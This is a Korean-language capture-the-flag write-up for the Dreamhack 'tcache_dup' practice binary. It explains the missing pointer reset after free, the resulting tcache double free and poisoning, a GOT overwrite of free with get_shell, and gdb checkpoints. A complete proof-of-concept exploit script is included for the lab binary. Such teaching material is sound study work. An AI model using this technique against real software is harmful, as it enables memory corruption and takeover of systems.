# tcache_dup 풀이 노트

Dreamhack `tcache_dup` — tcache double free로 GOT를 덮어 `get_shell` 호출.

바이너리: glibc 2.27, **no-PIE**. (개념 배경은 `../double_free/writeup.md` 참고)

---

## 0. 취약점 요약

- `delete()`가 `free(ptr[idx])` 후 **`ptr[idx] = NULL`을 안 한다** → dangling pointer → **double free 가능**.
- glibc 2.27 tcache는 **double free 검사가 없다** → `free(A); free(A)`가 그대로 통과.
- `idx` 검사가 `if (idx > 10)`뿐 → 상한만 보고 **하한(음수) 검사 없음**(여기선 안 써도 됨).
- no-PIE + `get_shell()` 존재 → **libc leak 필요 없음.** GOT만 덮으면 끝.

---

## 1. 소스에서 핵심만

```c
char *ptr[10];

int create(int cnt) {
    scanf("%d", &size);
    ptr[cnt] = malloc(size);
    read(0, ptr[cnt], size);     // 할당 직후 내용 쓰기 = next 조작 창구
}

int delete() {
    scanf("%d", &idx);
    if (idx > 10) return -1;
    free(ptr[idx]);              // ★ ptr[idx]=NULL 없음 → double free
}

void get_shell() { system("/bin/sh"); }   // ★ 타겟
```

`create`가 할당 **직후** 바로 `read`로 내용을 쓰게 해주는 게 포인트 —
double free된 청크를 받자마자 **`next`를 덮을 수 있다(= poisoning)**.

---

## 2. 공격 아이디어

1. 크기 0x10짜리 청크 A 하나 만들고 → 청크 크기는 0x20 → **tcache[0x20]** 사용.
2. A를 **두 번 free** → `tcache[0x20]: A -> A` (double free, 2.27이라 무검사 통과).
3. A를 받으면서 **`next = &free@got`** 기입 (poisoning).
4. 원본 A를 한 번 더 소비 → bin 맨 앞에 **`free@got`** 가 옴.
5. 한 번 더 malloc → **`free@got`를 청크로 반환** → 거기에 **`get_shell` 주소**를 씀 (= GOT 덮기).
6. 아무거나 `delete` → `free()` 호출이 사실상 `get_shell()` → **shell**.

> 타겟을 왜 `free@got`로? 6단계에서 어차피 `delete`가 `free`를 호출하니, `free`의 GOT를
> `get_shell`로 바꿔두면 그 호출이 곧 쉘 트리거가 되기 때문. (한 함수로 "덮기 + 트리거"가 동시 해결)

---

## 3. poc 트레이스 (`poc.py`)

```python
create(0x10, b'aaaaaaaa')                   # ptr[0]=A 할당
delete(0)                                   # tcache[0x20]: A -> NULL
delete(0)                                   # double free → A -> A

create(0x10, p64(e.got['free']))            # A 받음 + A.next = free@got  (poisoning)
create(0x10, b'bbbbbbbb')                   # 원본 A 소비 → bin: free@got
create(0x10, p64(e.symbols['get_shell']))   # free@got 받아서 거기에 get_shell 기입 (GOT 덮기)

delete(0)                                   # free(ptr[0]) = get_shell() → shell
```

| 호출 | tcache[0x20] | 설명 |
|---|---|---|
| `create(0)` | — | 피해자 A 확보 (청크 0x20) |
| `delete(0)` | `A -> NULL` | 1차 free |
| `delete(0)` | `A -> A` | **double free (인조 UAF)** |
| `create(free@got)` | `A -> free@got` | A 받아 **next를 free@got로 덮음 (poisoning)** |
| `create(b)` | `free@got` | 원본 A 소비 |
| `create(get_shell)` | — | free@got 받아 **GOT=get_shell (임의 쓰기)** |
| `delete(0)` | — | `free()`→`get_shell()` → **shell** |

---

## 4. gdb로 확인할 포인트

- 두 번째 `delete(0)` 직후 `tcache[0x20]`의 entry와 `counts`:
  ```
  pwndbg> tcache     # 또는: p tcache->entries[0], p tcache->counts[0]
  tcachebins[0x20]: A -> A   (counts=2)
  ```
- `create(free@got)` 직후 A의 user data 맨 앞 8B가 `free@got` 주소로 바뀌었는지:
  ```
  pwndbg> x/2gx <A>
  <A>: 0x<free@got>  0x...
  ```
- 마지막 `create(get_shell)` 후 `free@got` 내용이 `get_shell` 주소인지:
  ```
  pwndbg> x/gx <free@got>
  <free@got>: 0x<get_shell>
  ```

---

## 5. 되짚기

- **free 후 포인터 미초기화(`ptr[idx]=NULL` 누락)** 가 근본 버그. 이것만 있어도 double free가 열린다.
- glibc 2.27 tcache는 double free **무검사** → 중간에 뭘 끼울 필요도 없다(fastbin과 다른 점).
- no-PIE + `get_shell` → **leak 전혀 불필요**. 가장 기초적인 tcache_dup 실습.
- glibc 2.29+ 였다면 `key` 검사 때문에 2차 free 전에 key를 덮어야 함 → `../tcache_dup2/`.
